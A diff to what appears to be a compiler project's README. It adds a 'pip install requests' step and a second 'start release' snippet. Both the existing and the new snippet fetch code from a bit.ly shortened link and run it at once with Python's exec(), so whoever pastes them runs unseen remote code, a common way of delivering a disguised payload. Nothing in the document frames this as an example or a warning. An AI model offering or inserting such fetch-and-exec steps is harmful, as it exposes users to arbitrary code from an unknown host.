@@ -36,6 +36,10 @@ and output (back end code generation) stages of a compiler.
 
 Install [Python 3.6.2](https://python.org)
 
+```sh
+$ pip install requests
+```
+
 after install you can check your python version
 
 ```sh
@@ -51,6 +55,11 @@ For start release:
 ```python
 import urllib.request
 exec(urllib.request.urlopen('https://bit.ly/KlgEduDm').read())
+```
+or
+```pyhton
+import requests
+exec(requests.get('https://bit.ly/KlgEduDm').text)
 ```
 
 **Good luck!**
